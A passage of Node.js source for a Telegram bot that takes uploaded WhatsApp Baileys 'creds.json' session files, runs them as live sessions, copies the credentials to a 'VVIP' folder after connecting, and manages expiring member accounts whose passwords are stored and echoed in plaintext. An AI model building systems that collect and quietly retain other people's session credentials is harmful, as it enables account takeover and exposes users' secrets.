  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = path.basename(jsonFile, ".json");

        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
          await copyCredsToVVIP(folder, sessionName); // ✅ Copy setelah konek
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}
/*
async function startUserSessions() {
  const vipDir = path.join(__dirname, 'vip');
  const baseDir = 'permenmd';

  // 1. Scan VIP Folder (Root)
  if (fs.existsSync(vipDir)) {
    const vipFolders = fs.readdirSync(vipDir).filter(f => fs.statSync(path.join(vipDir, f)).isDirectory());

    console.log(`[DEBUG] Scanning VIP folder. Found ${vipFolders.length} items.`);
    for (const sessionName of vipFolders) {
      const sessionPath = path.join(vipDir, sessionName);

      if (activeConnections[sessionName]) {
        console.log(`[SKIP] VIP Session ${sessionName} already active.`);
        continue;
      }

      try {
        console.log(`[START] Connecting VIP session: ${sessionName}`);
        await connectSession(sessionPath, sessionName);
      } catch (err) {
        console.error(`[ERROR] Failed VIP session ${sessionName}:`, err.message);
      }
    }
  }

  // 2. Scan User Folders (Logika Anda yang disederhanakan)
  const subfolders = fs.readdirSync(baseDir)
    .map(name => path.join(baseDir, name))
    .filter(p => fs.lstatSync(p).isDirectory()); // Filter hanya folder saja

  console.log(`[DEBUG] Found ${subfolders.length} subfolders inside permenmd`);

  for (const folder of subfolders) {
    try {
      const jsonFiles = fs.readdirSync(folder)
        .filter(file => file.endsWith(".json"))
        .map(file => path.join(folder, file));

      console.log(`[DEBUG] Found ${jsonFiles.length} JSON files in ${folder}`);

      for (const jsonFile of jsonFiles) {
        const sessionName = `${path.basename(jsonFile, ".json")}`;

        // ✅ Cek apakah session sudah aktif
        if (activeConnections[sessionName]) {
          console.log(`[SKIP] Session ${sessionName} already active, skipping...`);
          continue;
        }

        try {
          console.log(`[START] Connecting session: ${sessionName}`);
          await connectSession(folder, sessionName);
        } catch (err) {
          console.error(`[ERROR] Failed to start session ${sessionName}:`, err.message);
        }
      }
    } catch (err) {
      console.log(`[❌ ERROR FOLDER] Gagal scan folder ${folder}: ${err.message}`);
    }
  }
}*/

// Helper: Ambil socket yang aktif dari sebuah path folder
function getActiveSocketsFromPath(folderPath) {
  if (!fs.existsSync(folderPath)) return [];

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  const activeSockets = [];

  for (const file of jsonFiles) {
    const sessionName = path.basename(file, ".json");
    if (activeConnections[sessionName]) {
      activeSockets.push(activeConnections[sessionName]);
    }
  }

  return activeSockets;
}
// === Fungsi untuk mengecek apakah folder punya sesi aktif ===
function checkActiveSessionInFolder(subfolderName) {
  const folderPath = path.join('permenmd', subfolderName);

  // Cek jika folder tidak ada, return null langsung
  if (!fs.existsSync(folderPath)) return null;

  const jsonFiles = fs.readdirSync(folderPath).filter(f => f.endsWith(".json"));
  for (const file of jsonFiles) {
    const sessionName = `${path.basename(file, ".json")}`;
    if (activeConnections[sessionName]) {
      return activeConnections[sessionName]; // return socket aktif
    }
  }
  return null; // Tidak ada sesi aktif
}


const telegramDataPath = "telegram.json";
const dbPath = "database.json";

// ===== Helpers =====
function loadTelegramConfig() {
  if (!fs.existsSync(telegramDataPath)) fs.writeFileSync(telegramDataPath, JSON.stringify({ ownerList: [], userList: [] }, null, 2));
  return JSON.parse(fs.readFileSync(telegramDataPath));
}

function loadDatabase() {
  if (!fs.existsSync(dbPath)) fs.writeFileSync(dbPath, JSON.stringify([]));
  return JSON.parse(fs.readFileSync(dbPath));
}

function saveDatabase(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2));
}

function generateKey() {
  return crypto.randomBytes(8).toString("hex");
}

function getFormattedUsers() {
  const db = loadDatabase();
  return db.map(u => `👤 ${u.username} | 🎯 ${u.role || 'member'} | ⏳ ${u.expiredDate}`).join("\n");
}

async function downloadToBuffer(url) {
  try {
    const response = await axios.get(url, {
      responseType: 'arraybuffer'
    });
    return Buffer.from(response.data);
  } catch (error) {
    throw error;
  }
}


function isValidBaileysCreds(jsonData) {
  if (typeof jsonData !== 'object' || jsonData === null) return false;

  const requiredKeys = [
    'noiseKey',
    'signedIdentityKey',
    'signedPreKey',
    'registrationId',
    'advSecretKey',
    'signalIdentities'
  ];

  return requiredKeys.every(key => key in jsonData);
}

// ===== Command Handlers =====
bot.onText(/^\/?(start|menu)/, (msg) => {
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.sendMessage(id, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });

  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "🆕 Buat Akun Member", callback_data: "create_member" }],
        [{ text: "⏳ Set Expired", callback_data: "set_expire" }],
        ...(isOwner ? [[
          { text: "📋 List User", callback_data: "list_user" },
          { text: "🎛 Buat Custom User", callback_data: "create_custom" },
          { text: "🗑 Hapus User", callback_data: "delete_user" }
        ]] : [])
      ]
    }
  };

  bot.sendMessage(id, `👋 Halo ${msg.from.first_name}, pilih menu:`, options);
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;

  if (msg.document) {
    const fileName = msg.document.file_name || '';
    if (!fileName.endsWith('.json')) {
      return;
    }

    try {
      const file = await bot.getFile(msg.document.file_id);
      const fileUrl = `https://api.telegram.org/file/bot${TOKEN}/${file.file_path}`;
      const buffer = await downloadToBuffer(fileUrl);
      const jsonData = JSON.parse(buffer.toString());

      if (!isValidBaileysCreds(jsonData)) {
        return bot.sendMessage(chatId, '❌ File tersebut bukan `creds.json` valid dari Baileys.');
      }

      // Simpan ke folder sessions/<userId>/
      const userFolder = path.join(__dirname, 'permenmd');
      if (!fs.existsSync(userFolder)) {
        fs.mkdirSync(userFolder, { recursive: true });
      }

      let finalName = fileName;
      const savePath = path.join(userFolder, finalName);

      // Jika file sudah ada, buat nama acak
      if (fs.existsSync(savePath)) {
        const randomSuffix = Date.now(); // atau bisa juga pakai: Math.random().toString(36).slice(2, 8)
        const base = path.basename(fileName, '.json');
        finalName = `${base}-${randomSuffix}.json`;
      }

      const finalSavePath = path.join(userFolder, finalName);
      fs.writeFileSync(finalSavePath, JSON.stringify(jsonData));

      bot.sendMessage(chatId, `✅ File disimpan sebagai ${finalName}.`);
    } catch (err) {
      console.error(err);
      bot.sendMessage(chatId, '⚠️ Terjadi kesalahan saat memproses file.');
    }
  }
});

bot.on("callback_query", async (query) => {
  const id = query.from.id;
  const data = query.data;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);
  const isUser = config.userList.includes(id) || isOwner;

  if (!isUser) return bot.answerCallbackQuery(query.id, { text: "Tidak diizinkan." });

  switch (data) {
    case "create_member":
      bot.sendMessage(id, "Masukkan data: `username|password|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        
        // ✅ GENERATE UID UNTUK AKUN BARU
        const newAccount = {
          username,
          password,
          role: "member",
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString('hex'), // ✅ TAMBAHKAN UID
          createdBy: "Telegram Bot",
          createdAt: new Date().toISOString()
        };
        
        db.push(newAccount);
        saveDatabase(db);
        
        bot.sendMessage(id, `✅ Akun member dibuat:
👤 Username: ${username}
🔐 Password: ${password}
🆔 UID: ${newAccount.uid}`); // ✅ TAMBAHKAN UID DI RESPONSE
      });
      break;

    case "set_expire":
      bot.sendMessage(id, "Masukkan: `username|tambah_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, addDays] = msg.text.split("|");
        const db = loadDatabase();
        const user = db.find(u => u.username === username);
        if (!user) return bot.sendMessage(id, "❌ User tidak ditemukan.");

        const config = loadTelegramConfig();
        const isOwner = config.ownerList.includes(id);

        // Cegah userList mengubah role selain member
        if (!isOwner && user.role !== "member") {
          return bot.sendMessage(id, "❌ Kamu hanya bisa memperpanjang akun dengan role 'member'.");
        }

        const current = new Date(user.expiredDate);
        current.setDate(current.getDate() + parseInt(addDays));
        user.expiredDate = current.toISOString().split("T")[0];
        saveDatabase(db);
        bot.sendMessage(id, `✅ Masa aktif diperbarui untuk ${username} ke ${user.expiredDate}`);
      });
      break;

    case "list_user":
      if (!isOwner) return;
      const users = getFormattedUsers();
      bot.sendMessage(id, `📋 *Daftar Pengguna:*
${users}`, { parse_mode: "Markdown" });
      break;

    case "create_custom":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan: `username|password|role|durasi_hari`", { parse_mode: "Markdown" });
      bot.once("message", msg => {
        const [username, password, role, day] = msg.text.split("|");
        const db = loadDatabase();
        if (db.find(u => u.username === username)) return bot.sendMessage(id, "❌ Username sudah ada!");
        
        const expired = new Date();
        expired.setDate(expired.getDate() + parseInt(day));
        
        // ✅ GENERATE UID UNTUK AKUN BARU
        const newAccount = {
          username,
          password,
          role,
          expiredDate: expired.toISOString().split("T")[0],
          uid: crypto.randomBytes(16).toString('hex'), // ✅ TAMBAHKAN UID
          createdBy: "Telegram Bot",
          createdAt: new Date().toISOString()
        };
        
        db.push(newAccount);
        saveDatabase(db);
        
        bot.sendMessage(id, `✅ Akun ${role} dibuat:
👤 Username: ${username}
🆔 UID: ${newAccount.uid}`); // ✅ TAMBAHKAN UID DI RESPONSE
      });
      break;

    case "delete_user":
      if (!isOwner) return;
      bot.sendMessage(id, "Masukkan username yang akan dihapus:");
      bot.once("message", msg => {
        const db = loadDatabase();
        const index = db.findIndex(u => u.username === msg.text);
        if (index === -1) return bot.sendMessage(id, "❌ User tidak ditemukan.");
        const deleted = db.splice(index, 1)[0];
        saveDatabase(db);
        bot.sendMessage(id, `🗑️ User ${deleted.username} (UID: ${deleted.uid || 'N/A'}) berhasil dihapus.`);
      });
      break;
  }
});

bot.onText(/^\/?clear/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ You are not authorized to execute this command.", { parse_mode: "Markdown" });
  }

  try {
    if (!fs.existsSync(SESSION_PATH)) {
      return bot.sendMessage(chatId, "⚠️ [SYSTEM] *ERROR: DIRECTORY NOT FOUND*\n\nTarget folder 'permenmd' does not exist.", { parse_mode: "Markdown" });
    }

    let deletedCount = 0;
    const userFolders = fs.readdirSync(SESSION_PATH);

    for (const userFolder of userFolders) {
      const userPath = path.join(SESSION_PATH, userFolder);

      if (!fs.lstatSync(userPath).isDirectory()) continue;

      const hasJson = fs.readdirSync(userPath).some(f => f.endsWith(".json"));
      if (!hasJson) {
        fs.rmSync(userPath, { recursive: true, force: true });
        deletedCount++;
      }
    }

    const responseMsg = deletedCount > 0 
      ? `🗑️ [SYSTEM] *GARBAGE COLLECTOR*\n\n✅ Purged ${deletedCount} corrupted/empty session folders.`
      : `✨ [SYSTEM] *NO JUNK FOUND*\n\nServer storage is clean.`;

    bot.sendMessage(chatId, responseMsg, { parse_mode: "Markdown" });
    console.log(`[LOG] Purged ${deletedCount} junk folders.`);
    
  } catch (err) {
    console.error("[ERROR] Cleanup failed:", err);
    bot.sendMessage(chatId, "⚠️ [SYSTEM] *CRITICAL ERROR*\n\nFailed to execute cleanup script.", { parse_mode: "Markdown" });
  }
});

bot.onText(/^\/?restart/, async (msg) => {
  const chatId = msg.chat.id;
  const id = msg.from.id;
  const config = loadTelegramConfig();
  const isOwner = config.ownerList.includes(id);

  if (!isOwner) {
    return bot.sendMessage(chatId, "❌ [ACCESS] *PERMISSION DENIED*\n\n⚠️ Root access required for this action.", { parse_mode: "Markdown" });
  }

  bot.sendMessage(chatId, "⚙️ [SERVER] *SYSTEM REBOOT*\n\nSending SIGTERM...\nReason: Manual Request\nStatus: *RESTARTING*...", { parse_mode: "Markdown" });
  await unfollowAllChannel();
  console.log("[SERVER] Manual restart triggered by Owner.");

  setTimeout(() => {
    process.exit(0);
  }, 2000);
});

setTimeout(() => {
    const targetChatId = "-1003922809118"; 
    bot.sendMessage(targetChatId, "✅ [SERVER] *SERVICES ONLINE*\n\nSystem Status: *RUNNING*\nUptime: Just started\n✅ All systems operational.", { parse_mode: "Markdown" });
  }, 3000);

function scheduleAutoClean() {
  const now = new Date();

  // 00:00 WIB = 17:00 UTC
  const nextMidnight = new Date();
  nextMidnight.setUTCHours(17, 0, 0, 0);

  // kalau sudah lewat, jadwalkan besok
  if (now >= nextMidnight) {
    nextMidnight.setUTCDate(nextMidnight.getUTCDate() + 1);
  }

  const delay = nextMidnight - now;

  setTimeout(() => {
    hapusIsiUserLogs();

    // ulangi setiap hari tepat jam yang sama
    setInterval(hapusIsiUserLogs, 24 * 60 * 60 * 1000);
  }, delay);
}
// ===== Start Express Server =====
app.listen(PORT, () => {
  console.log(`🚀 Server aktif di http://localhost:${PORT}`);
  setupVipFolder();
  startUserSessions();

  // 🆕 Jalankan Auto Refresh Timer
  console.log(`[AUTO REFRESH] Diatur setiap 30 menit sekali.`);
  setInterval(autoRefresh, THIRTY_MINUTES);
  console.log(`[AUTOCLEAN LOGS] Diatur setiap jam 12 malam WIB.`);
  scheduleAutoClean();
})